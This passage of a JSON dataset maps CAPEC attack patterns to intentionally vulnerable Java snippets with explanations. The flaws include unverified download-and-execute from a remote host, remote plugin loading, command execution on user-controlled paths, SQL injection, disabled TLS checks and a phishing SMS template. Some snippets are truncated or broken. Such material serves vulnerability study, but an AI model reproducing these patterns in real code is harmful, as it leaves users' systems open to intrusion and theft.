        "description": "This code demonstrates vulnerable DNS resolution practices by not validating the authenticity of DNS responses, blindly trusting reverse DNS lookups, and failing to verify the correspondence between hostnames and IP addresses. It's susceptible to DNS cache poisoning and pharming attacks as it doesn't implement any verification mechanisms for DNS responses or validate the trustworthiness of the DNS source."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "public class FileManager {\n    private static final String WEB_ROOT = \"/var/www/html/\";\n    \n    public void setupWebsite() {\n        // Store sensitive files directly under web root\n        saveConfigFile(WEB_ROOT + \"database.config\");\n        saveLogFile(WEB_ROOT + \"system.log\");\n        \n        // Create searchable index of all documents without access control\n        indexAllDocuments(WEB_ROOT + \"documents/\");\n        \n        // Expose version control directory\n        copyGitRepo(WEB_ROOT + \".git/\");\n        \n        // Download and execute remote code without verification\n        downloadAndExecute(\"http://remote-server.com/script.jar\");\n    }\n    \n    private void downloadAndExecute(String url) {\n        try {\n            URL remoteUrl = new URL(url);\n            URLConnection conn = remoteUrl.openConnection();\n            InputStream is = conn.getInputStream();\n            // Execute downloaded code without verification\n            // ...\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including storing sensitive files under web root, exposing version control repositories, creating unrestricted search indices, and downloading/executing code without verification. The code makes these resources directly accessible through URLs without proper authorization checks."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "public class WebServiceEndpoint {\n    @WebService\n    @Path(\"/api/internal\")\n    public class InternalService {\n        private static final String WSDL_PATH = \"/services/internal.wsdl\";\n        private static final String PLUGIN_REPO = \"http://internal-plugins.company.com\";\n        \n        @GET\n        @Path(\"/getAdminData\")\n        public Response getAdminData() {\n            // No authentication check implemented\n            return Response.ok(retrieveSensitiveData()).build();\n        }\n        \n        @POST\n        @Path(\"/loadPlugin\")\n        public void loadPlugin(@QueryParam(\"url\") String pluginUrl) {\n            // Downloads and executes plugin without verification\n            URL url = new URL(pluginUrl);\n            URLClassLoader loader = new URLClassLoader(new URL[]{url});\n            Class<?> pluginClass = loader.loadClass(\"Plugin\");\n            pluginClass.newInstance().execute();\n        }\n        \n        @GET\n        @Path(\"/repo\")\n        public Response getSourceRepo() {\n            // Exposes version control repository\n            File gitRepo = new File(\".git\");\n            return Response.ok(gitRepo).build();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities: it exposes an internal web service without proper access controls, allows direct access to WSDL files and Git repositories, downloads and executes code without verification, and lacks proper authentication mechanisms. The service endpoints can be discovered through forced browsing, and sensitive operations are not properly protected."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "public class WeakChecksumValidator {\n    public static boolean validateMessage(String message, String receivedChecksum) {\n        // Using weak MD5 hash for checksum\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] digest = md.digest(message.getBytes());\n            String calculatedChecksum = new BigInteger(1, digest).toString(16);\n            \n            // Simple string comparison without timing-safe comparison\n            return calculatedChecksum.equals(receivedChecksum);\n        } catch (NoSuchAlgorithmException e) {\n            return false;\n        }\n    }\n    \n    public static void processSecureMessage(String message, String checksum) {\n        // No validation of checksum source or integrity\n        if (validateMessage(message, checksum)) {\n            // Process message without verifying message tampering\n            processMessage(message);\n        }\n    }\n    \n    private static void processMessage(String message) {\n        // Process the potentially tampered message\n        System.out.println(\"Processing message: \" + message);\n    }\n}",
        "description": "This vulnerable code uses MD5 (a weak hash algorithm) for checksum validation, lacks proper integrity checks during transmission, and performs naive checksum comparison. The code doesn't validate the source of the checksum, making it susceptible to checksum spoofing attacks where an attacker can modify both the message and its corresponding checksum. It also lacks proper message integrity enforcement during transmission and uses mutable data for verification."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "public class XMLSchemaProcessor {\n    public void processOrder(HttpServletRequest request) throws Exception {\n        String schemaLocation = request.getParameter(\"schemaLocation\");\n        String xmlData = request.getParameter(\"xmlData\");\n        \n        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n        Schema schema = factory.newSchema(new File(schemaLocation));\n        \n        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\n        \n        // Create XPath expression from user input without validation\n        String userXPath = request.getParameter(\"xpath\");\n        XPath xpath = XPathFactory.newInstance().newXPath();\n        NodeList nodes = (NodeList) xpath.evaluate(userXPath, doc, XPathConstants.NODESET);\n        \n        // Process XML without schema validation\n        processXMLData(doc);\n    }\n    \n    private void processXMLData(Document doc) {\n        // Process the XML document\n    }\n}",
        "description": "This vulnerable code accepts an external schema location and XML data from user input without proper validation. It processes XML documents without schema validation and uses unvalidated XPath expressions from user input. The code is susceptible to schema poisoning, XML injection, and XPath injection attacks. Additionally, it allows external control of critical configuration settings through the schemaLocation parameter."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "\"import javax.xml.soap.*;\nimport java.net.URL;\n\npublic class VulnerableSOAPProcessor {\n    public void processMessages() {\n        try {\n            SOAPConnectionFactory soapConnectionFactory = SOAPConnectionFactory.newInstance();\n            SOAPConnection connection = soapConnectionFactory.createConnection();\n            \n            while (true) {\n                // Create SOAP message without size validation or rate limiting\n                MessageFactory messageFactory = MessageFactory.newInstance();\n                SOAPMessage message = messageFactory.createMessage();\n                SOAPPart soapPart = message.getSOAPPart();\n                SOAPEnvelope envelope = soapPart.getEnvelope();\n                \n                // Process incoming XML without schema validation\n                URL endpoint = new URL(\\\"http://example.com/service\\\");\n                SOAPMessage response = connection.call(message, endpoint);\n                \n                // Store all messages in memory without limits\n                processResponse(response);",
        "description": "\"This code demonstrates multiple vulnerabilities: it processes SOAP messages without any resource limits or throttling (CWE-770), lacks XML validation against a schema (CWE-112), uses cleartext HTTP communication (CWE-319), and stores messages indefinitely in memory without cleanup (CWE-400). The infinite loop processing messages without rate limiting makes it susceptible to XML-based DoS attacks.\""
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "public class ContentManager {\n    private String contentSource = \"http://trusted-domain.com/content\";\n    \n    public String fetchAndDisplayContent(String contentId) {\n        try {\n            URL url = new URL(contentSource + \"?id=\" + contentId);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            // No SSL/TLS verification\n            if (conn instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) conn).setHostnameVerifier((hostname, session) -> true);\n            }\n            \n            // No origin validation\n            conn.setRequestMethod(\"GET\");\n            \n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder content = new StringBuilder();\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                // Directly process raw content without validation\n                content.append(line);\n            }\n            \n            // Display content without checking integrity\n            return content.toString();\n            \n        } catch (Exception e) {\n            return \"Error loading content\";\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple content spoofing vulnerabilities. It lacks proper SSL/TLS verification, doesn't validate the content source, accepts raw unvalidated content, and doesn't implement message integrity checks. The code blindly trusts the content source and doesn't verify if the content has been modified during transmission. Additionally, it lacks CSRF protection and proper destination verification for the communication channel."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "public class TempFileHandler {\n    public static File createTempLog(String userInput) {\n        try {\n            String tempDir = System.getProperty(\"java.io.tmpdir\");\n            String fileName = \"log_\" + userInput + \".tmp\";\n            File tempFile = new File(tempDir, fileName);\n            \n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Log data here\");\n            writer.close();\n            \n            tempFile.deleteOnExit();\n            return tempFile;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n    \n    public static void main(String[] args) {\n        String userInput = args[0];\n        File tempFile = createTempLog(userInput);\n        // Use the temp file...\n    }\n}",
        "description": "This code creates a temporary file with a predictable name pattern based on user input, without proper validation or secure permissions. It uses a shared temporary directory and doesn't implement proper file locking or access controls. The file name is directly influenced by user input, making it susceptible to path traversal attacks. The code also doesn't properly handle file permissions or implement secure file creation practices."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "public class FileManager {\n    private static final String CONFIG_DIR = \"/etc\";\n    private static final String LOG_DIR = \"/var/log\";\n    private static final String TEMP_DIR = \"/tmp\";\n    \n    public void handleSensitiveData() {\n        String[] sensitiveData = {\"password123\", \"private_key\", \"auth_token\"};\n        File tempFile = new File(TEMP_DIR + \"/sensitive_data.txt\");\n        \n        try {\n            FileWriter writer = new FileWriter(tempFile);\n            for(String data : sensitiveData) {\n                writer.write(data + \"\\n\");\n            }\n            writer.close();\n            \n            // Improper deletion of sensitive data\n            tempFile.delete();\n            \n            // Debug information left in system\n            System.out.println(\"Debug: Sensitive data was stored in \" + tempFile.getPath());\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void accessSystemFiles() {\n        File configDir = new File(CONFIG_DIR);\n        File[] files = configDir.listFiles();\n        \n        // Expose system files without proper access control\n        for(File file : files) {\n            file.setReadable(true, false);\n            file.setWritable(true, false);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of sensitive data and system files. It stores sensitive information in predictable locations (/tmp), fails to properly scrub the data, leaves debug information exposed, and sets insecure permissions on system files. The code makes configuration directories world-readable and writable, and doesn't properly clean up sensitive data after use."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "public class SimpleAuthenticator {\n    private static final String ADMIN_TOKEN = \"admin123\";\n    \n    public boolean authenticate(String clientToken, String ipAddress) {\n        // Vulnerable: Assumes IP address and token are sufficient and immutable\n        if (ipAddress.startsWith(\"192.168.\") && clientToken.equals(ADMIN_TOKEN)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void processAdminRequest(String clientToken, String ipAddress, String command) {\n        if (authenticate(clientToken, ipAddress)) {\n            // No additional verification of identity\n            executeCommand(command);\n        }\n    }\n    \n    private void executeCommand(String command) {\n        // Execute privileged command\n        System.out.println(\"Executing: \" + command);\n    }\n}",
        "description": "This code is vulnerable to identity spoofing as it uses weak authentication mechanisms. It relies on a hardcoded token and IP address prefix check without proper cryptographic verification. An attacker can spoof their IP address and, if they obtain the static token, can impersonate an admin. The code also lacks proper entity authentication during the session and assumes the IP address and token are immutable security controls."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "public class UserRegistration {\n    public boolean validateUser(String username, String role) {\n        // No validation of username format/structure\n        if(role != null && role.contains(\"admin\")) {\n            return true;\n        }\n        \n        // Directly using raw input in SQL query\n        String query = \"SELECT * FROM users WHERE username='\" + username + \"'\";\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/db\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            return rs.next();\n        } catch (SQLException e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates improper input validation by not checking the format or structure of the username input, and allowing manipulation of the role parameter without proper validation. It accepts any string input without verifying syntax or type, and uses untrusted input directly in security decisions and SQL queries, making it vulnerable to SQL injection and privilege escalation attacks."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "public class ResourceDownloader {\n    private String baseUrl = \"https://downloads.company.com\";\n\n    public byte[] downloadResource(String resourcePath) {\n        String requestedUrl = baseUrl + resourcePath;\n        try {\n            URL url = new URL(requestedUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            // No host validation or SSL verification\n            conn.setFollowRedirects(true);\n            \n            // Blindly trust the response without verifying source\n            try (InputStream is = conn.getInputStream()) {\n                return is.readAllBytes();\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    // Vulnerable setter allowing base URL manipulation\n    public void setBaseUrl(String newBaseUrl) {\n        this.baseUrl = newBaseUrl;\n    }\n}",
        "description": "This vulnerable code demonstrates a resource download system that can be exploited through URL spoofing and redirection. The code fails to properly validate the resource location, allows arbitrary base URL changes, and doesn't verify the authenticity of the source. An attacker could manipulate the baseUrl or provide a malicious resourcePath to redirect downloads to their controlled server, potentially leading to malware distribution or sensitive data exposure."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "public class TempFileHandler {\n    public void processSensitiveData(String userData) {\n        try {\n            File tempFile = new File(\"/tmp/user_data.tmp\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Credit Card: \" + userData);\n            writer.close();\n            \n            // Process the data\n            Thread.sleep(1000);\n            \n            // Read back the data\n            BufferedReader reader = new BufferedReader(new FileReader(tempFile));\n            String data = reader.readLine();\n            reader.close();\n            \n            // Attempt to delete but don't verify\n            tempFile.delete();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple temporary file vulnerabilities: creating a temp file with default permissions in a world-readable directory (/tmp), storing sensitive data (credit card information) in plaintext, not using secure file deletion methods, and not properly closing resources in a finally block. The file is created with default permissions that may allow other users to read its contents, and the deletion is not guaranteed."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "public class SensitiveDataTransmitter {\n    public void transmitCredentials(String username, String password) {\n        Socket socket = new Socket(\"remote-server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        \n        // Transmitting sensitive data in cleartext\n        out.println(\"username=\" + username);\n        out.println(\"password=\" + password);\n        \n        // Sending bank account information without encryption\n        String accountInfo = \"accNum=12345&routingNum=67890\";\n        out.println(accountInfo);\n        \n        out.close();\n        socket.close();\n    }\n}",
        "description": "This vulnerable code demonstrates unencrypted transmission of sensitive data (credentials and banking information) over a network socket. The data is sent in cleartext, making it susceptible to network sniffing attacks. The code lacks encryption, message integrity checks, and proper security controls, allowing attackers to easily intercept and read sensitive information during transmission."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "public class InsecureLoginSystem {\n    public static void sendCredentials(String username, String password) {\n        Socket socket = new Socket(\"auth.example.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        \n        // Send credentials in plain text\n        String credentials = username + \":\" + password;\n        out.println(credentials);\n        \n        // Send system information without encryption\n        String systemInfo = System.getProperty(\"os.name\") + \"|\" +\n                           System.getProperty(\"user.name\") + \"|\" +\n                           System.getProperty(\"java.version\");\n        out.println(systemInfo);\n        \n        // Keep connection open and continuously send status updates\n        while(true) {\n            String status = \"ONLINE:\" + System.currentTimeMillis();\n            out.println(status);\n            Thread.sleep(1000);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to network sniffing: transmitting sensitive credentials and system information in cleartext, continuous network message transmission without rate limiting, and lack of encryption for sensitive data. The code sends login credentials, system properties, and status updates over an unencrypted socket connection, making it susceptible to network sniffing attacks."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "public class LibraryLoader {\n    private static final String LIB_PATH = System.getProperty(\"java.library.path\");\n\n    public static void loadCustomLibrary(String libraryName) {\n        String libPath = System.getenv(\"USER_LIB_PATH\");\n        if (libPath != null) {\n            System.setProperty(\"java.library.path\", libPath);\n        }\n\n        try {\n            String fullPath = libPath + File.separator + libraryName;\n            System.load(fullPath);\n        } catch (UnsatisfiedLinkError e) {\n            // Fallback to default path\n            System.loadLibrary(libraryName);\n        }\n    }\n\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            loadCustomLibrary(args[0]);\n        }\n    }\n}",
        "description": "This vulnerable code allows external control of library loading paths through environment variables and command-line arguments. It doesn't validate the library path or name, allowing an attacker to load malicious libraries by manipulating the USER_LIB_PATH environment variable or providing a crafted library name. The code directly uses user input for filesystem operations and library loading without proper validation."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "public class UnsafeTemplateProcessor {\n    private String templateEngine(String userInput) {\n        String template = \"<div>Welcome, \" + userInput + \"!</div>\";\n        return template;\n    }\n\n    public void processUserContent(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"content\");\n        String processedTemplate = templateEngine(userInput);\n        \n        response.setHeader(\"X-Custom-Header\", userInput);\n        response.setContentType(\"text/html\");\n        response.getWriter().write(processedTemplate);\n    }\n\n    public void handleError(String errorMessage, HttpServletResponse response) throws IOException {\n        String errorPage = \"<html><body><div class='error'>\" + \n                          errorMessage + \n                          \"</div></body></html>\";\n        response.getWriter().write(errorPage);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple issues related to improper input validation and script injection. It directly incorporates user input into HTML templates without sanitization, allows script injection through HTTP headers, and creates error pages with unsanitized content. The code fails to validate input origin and doesn't properly escape special characters, making it susceptible to XSS attacks through template injection."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "public class NetworkRouter {\n    private static final String BANK_URL = \"www.legitbank.com\";\n    private Map<String, String> routingTable = new HashMap<>();\n\n    public void initializeRouting() {\n        // Insecure routing table initialization without validation\n        routingTable.put(BANK_URL, getDNSEntry(BANK_URL));\n    }\n\n    public String getDNSEntry(String hostname) {\n        try {\n            // Vulnerable DNS lookup without verification\n            InetAddress address = InetAddress.getByName(hostname);\n            return address.getHostAddress();\n        } catch (UnknownHostException e) {\n            return null;\n        }\n    }\n\n    public Socket establishConnection(String targetHost, int port) {\n        try {\n            // No validation of actual destination IP\n            String resolvedIP = routingTable.get(targetHost);\n            // No SSL/TLS verification\n            Socket socket = new Socket(resolvedIP, port);\n            // No message integrity checking\n            return socket;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void sendSensitiveData(Socket socket, String data) {\n        try {\n            // Sending data without verifying endpoint authenticity\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed network routing implementation that could enable pharming attacks. It lacks proper endpoint verification, doesn't validate DNS responses, fails to implement message integrity checks, and doesn't properly secure communication channels. The code allows for potential manipulation of routing information and doesn't verify the authenticity of network endpoints, making it susceptible to man-in-the-middle attacks and unauthorized access to sensitive information."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "public class OnlineStore {\n    public double calculateTotal(String userId, String itemId, String priceHiddenField) {\n        // Blindly trust price from hidden form field\n        double price = Double.parseDouble(priceHiddenField);\n        \n        // No verification of price against server-side records\n        OrderItem item = new OrderItem(itemId, price);\n        \n        // Process payment with potentially manipulated price\n        PaymentProcessor processor = new PaymentProcessor();\n        return processor.processPayment(userId, item);\n    }\n    \n    // HTML form in JSP/template\n    // <form action=\"/process\" method=\"POST\">\n    //     <input type=\"hidden\" name=\"price\" value=\"99.99\">\n    //     <input type=\"hidden\" name=\"itemId\" value=\"123\">\n    //     <input type=\"submit\" value=\"Buy Now\">\n    // </form>\n}",
        "description": "This code demonstrates a vulnerable e-commerce implementation where the server blindly trusts client-side price data sent through hidden form fields. The calculateTotal method accepts a price parameter from a hidden form field without validating it against server-side stored values, allowing attackers to modify the price client-side before submission. This violates secure design principles by relying on client-side security controls and processing untrusted input in security-critical operations."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "public class EmailValidator {\n    private static final String TRUSTED_DOMAIN = \"company.com\";\n    \n    public static boolean processEmailLink(String emailFrom, String redirectUrl) {\n        // Weak validation of sender email\n        if (emailFrom.endsWith(TRUSTED_DOMAIN)) {\n            try {\n                // Direct redirect to user-provided URL without validation\n                HttpServletResponse response = getCurrentResponse();\n                response.sendRedirect(redirectUrl);\n                \n                // Open link in new window with unsafe window.opener access\n                String script = \"window.open('\" + redirectUrl + \"', '_blank');\";\n                response.getWriter().write(\"<script>\" + script + \"</script>\");\n                \n                return true;\n            } catch (IOException e) {\n                return false;\n            }\n        }\n        return false;\n    }\n    \n    private static HttpServletResponse getCurrentResponse() {\n        // Implementation to get current response object\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed email validation and URL redirection system that could enable spear phishing attacks. It has multiple security issues: weak email sender validation that only checks domain suffix, direct URL redirection without proper validation (CWE-601), and unsafe window.opener access when opening links (CWE-1022). The code blindly trusts input parameters and redirects users to potentially malicious sites, making it susceptible to sophisticated phishing attacks."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "public class MobileAuthenticationService {\n    private static final int MAX_LOGIN_ATTEMPTS = Integer.MAX_VALUE; // No limit on login attempts\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public boolean authenticateUser(String phoneNumber, String password) {\n        String storedPassword = userCredentials.get(phoneNumber);\n        return storedPassword != null && storedPassword.equals(password); // Simple password comparison\n    }\n\n    public void sendAuthenticationSMS(String phoneNumber) {\n        String message = \"URGENT: Your account requires verification. Click here: http://bit.ly/fakebank\";\n        String senderID = \"YourBank\"; // Spoofed sender ID\n        SMSUtil.send(phoneNumber, message, senderID);\n    }\n\n    public String displayLoginPrompt() {\n        return \"<div class='login-form'>\"\n            + \"<img src='fake-bank-logo.png' alt='Bank Logo'>\"\n            + \"<input type='text' placeholder='Phone Number'>\"\n            + \"<input type='password' placeholder='Password'>\"\n            + \"<button onclick='login()'>Login</button>\"\n            + \"</div>\";\n    }\n}",
        "description": "This vulnerable code demonstrates mobile phishing attacks through SMS and weak authentication. It includes unrestricted login attempts, single-factor authentication, password-only verification, spoofed sender IDs, and a deceptive UI that can be used in phishing attacks. The code lacks proper validation, rate limiting, and secure authentication mechanisms."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "public class FileProcessor {\n    public void processUploadedFile(String fileName, String userContent) {\n        try {\n            String tempDir = System.getProperty(\"java.io.tmpdir\");\n            String filePath = tempDir + File.separator + fileName;\n            \n            // Write user content to temporary file\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(userContent);\n            writer.close();\n            \n            // Process file based on extension\n            if(fileName.toLowerCase().endsWith(\".xml\")) {\n                executeXmlProcessor(filePath);\n            } else if(fileName.toLowerCase().endsWith(\".script\")) {\n                executeScriptProcessor(filePath);\n            }\n            \n            // Clean up\n            new File(filePath).delete();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void executeXmlProcessor(String filePath) {\n        // Process XML file\n        Runtime.getRuntime().exec(\"xmlprocessor \" + filePath);\n    }\n    \n    private void executeScriptProcessor(String filePath) {\n        // Process script file\n        Runtime.getRuntime().exec(\"scriptengine \" + filePath);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple file manipulation issues: it creates an insecure temporary file (CWE-377), relies on file extension for processing decisions (CWE-646), allows control of file path (CWE-73), and doesn't sanitize file names which could lead to path traversal (CWE-22). The code also performs resource injection by directly using user input in system commands (CWE-99). An attacker could exploit this by uploading files with manipulated names or extensions to achieve arbitrary code execution."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class DeviceController {\n    private boolean isAuthenticated = false;\n    private int securityLevel = 0;\n    private boolean isLocked = false;\n    \n    public void powerSaveMode() {\n        // Incorrectly handling security state during power transition\n        isAuthenticated = false;\n        securityLevel = 0;\n        isLocked = false;\n    }\n    \n    public void restoreFromPowerSave() {\n        // No verification of previous security state\n        // No re-authentication required\n        isAuthenticated = true;\n        securityLevel = 3;  // Assuming highest security level\n    }\n    \n    public boolean updateConfiguration(String config) {\n        // No authentication check after power restore\n        if (!isLocked) {\n            applyConfiguration(config);\n            return true;\n        }\n        return false;\n    }\n    \n    private void applyConfiguration(String config) {\n        // Apply potentially dangerous configuration changes\n        // without proper authentication or state verification\n    }\n}",
        "description": "This code demonstrates vulnerability to state manipulation attacks through power transitions. The code fails to properly maintain security states during power save/restore operations, doesn't require re-authentication after power state changes, and allows configuration changes without proper authentication verification. The security settings are reset to insecure defaults during power transitions, and the lock state isn't properly preserved."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "public class SystemDebugger {\n    private static final String DEBUG_KEY = \"debug123\";\n    \n    public static void enableDebugMode(String key) {\n        if(key.equals(DEBUG_KEY)) {\n            // Expose sensitive system information through debug trace\n            System.out.println(\"System Info: \" + System.getProperties());\n            System.out.println(\"Memory Info: \" + Runtime.getRuntime().totalMemory());\n            System.out.println(\"Class Path: \" + System.getProperty(\"java.class.path\"));\n            \n            // Store trace data in plain text file\n            try {\n                FileWriter fw = new FileWriter(\"debug_trace.log\", true);\n                fw.write(\"Stack Trace: \" + Thread.currentThread().getStackTrace().toString());\n                fw.write(\"\\nRuntime Instructions: \" + getInstructions());\n                fw.close();\n            } catch(IOException e) {}\n        }\n    }\n    \n    private static String getInstructions() {\n        // Simulated function that would expose runtime bytecode/instructions\n        return \"JVM Instructions and Memory Layout\";\n    }\n}",
        "description": "This code demonstrates vulnerable debug functionality that allows white box analysis by exposing system internals, storing sensitive trace data in unprotected locations, and providing access to runtime instructions. The debug mode can be activated with a hardcoded key, potentially allowing unauthorized access to system-level information. The code stores sensitive trace data in plaintext files and exposes detailed system properties and runtime information that could be used for reverse engineering or exploitation."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "public class FileHandler {\n    public static void writeToFile(String filename, String data) {\n        try {\n            String command = String.format(\"cmd.exe /c echo %s > \\\"%s:hidden.txt\\\"\", data, filename);\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void storeCredentials(String username, String password) {\n        String normalFile = \"C:\\\\Users\\\\Public\\\\Documents\\\\app.log\";\n        // Store sensitive data in alternate data stream\n        writeToFile(normalFile, username + \":\" + password);\n        \n        // Regular file appears empty or with non-sensitive content\n        try (FileWriter fw = new FileWriter(normalFile)) {\n            fw.write(\"Application Log File\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable handling of sensitive data by storing credentials in an NTFS Alternate Data Stream. The code creates a normal file but hides sensitive information in an ADS named 'hidden.txt'. The main file appears innocuous, while the sensitive data remains hidden from standard file system tools. The code fails to properly secure the data and doesn't implement proper access controls for the ADS, making it vulnerable to information disclosure."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "public class UserAuthenticator {\n    private Map<String, User> userDatabase = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        User user = userDatabase.get(username);\n        long startTime = System.nanoTime();\n        \n        if (user != null) {\n            // Vulnerable timing attack due to early return\n            if (user.getFailedAttempts() >= 3) {\n                return false;\n            }\n            \n            // Different processing time reveals if user exists\n            for (int i = 0; i < password.length(); i++) {\n                if (i >= user.getPassword().length() || \n                    password.charAt(i) != user.getPassword().charAt(i)) {\n                    user.incrementFailedAttempts();\n                    System.out.println(\"Login failed for user: \" + username.substring(0, 3) + \"...\");\n                    return false;\n                }\n                Thread.sleep(5); // Artificial delay per character\n            }\n            return true;\n        }\n        return false;\n    }",
        "description": "This code demonstrates several vulnerabilities related to information exposure and behavioral discrepancy. The authentication process leaks information through timing attacks (different processing times for existing vs non-existing users), truncates sensitive information in logs (username truncation), and exhibits observable behavioral differences through sleep delays. It also creates an emergent timing side-channel that allows attackers to probe user existence and password length."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "public class WebServer {\n    @WebServlet(\"/info\")\n    public class SystemInfoServlet extends HttpServlet {\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n            String username = request.getParameter(\"username\");\n            String password = request.getParameter(\"password\");\n            \n            response.setHeader(\"Server\", \"Apache/2.4.41 (Ubuntu)\");\n            response.setHeader(\"X-Powered-By\", \"PHP/7.4.3\");\n            \n            try {\n                String osInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n                String javaVersion = System.getProperty(\"java.version\");\n                String serverInfo = getServletContext().getServerInfo();\n                \n                PrintWriter out = response.getWriter();\n                out.println(\"System Info: \" + osInfo);\n                out.println(\"Java Version: \" + javaVersion);\n                out.println(\"Server Info: \" + serverInfo);\n                \n                if(request.getParameter(\"debug\") != null) {\n                    Enumeration<String> headerNames = request.getHeaderNames();\n                    while(headerNames.hasMoreElements()) {\n                        String headerName = headerNames.nextElement();\n                        out.println(headerName + \": \" + request.getHeader(headerName));\n                    }\n                }\n            } catch(Exception e) {\n                response.getWriter().println(\"Error details: \" + e.getMessage());\n                e.printStackTrace(response.getWriter());\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates several security issues related to information disclosure and fingerprinting. It exposes sensitive system information through HTTP headers and error messages, uses GET requests with sensitive parameters, reveals detailed system properties, and includes a debug mode that dumps all request headers. The error handling also reveals detailed stack traces and system information. These vulnerabilities allow attackers to gather information about the system for targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "public class DynamicVariableEval {\n    public static void main(String[] args) {\n        String userInput = args[0];\n        String varName = \"user_\" + userInput;\n        \n        // Unsafe dynamic evaluation of variable names\n        try {\n            String evalExpression = \"int \" + varName + \" = 42;\";\n            ScriptEngineManager manager = new ScriptEngineManager();\n            ScriptEngine engine = manager.getEngineByName(\"javascript\");\n            engine.eval(evalExpression);\n            \n            // Dynamically accessing variable through eval\n            engine.eval(\"println(\" + varName + \");\");\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
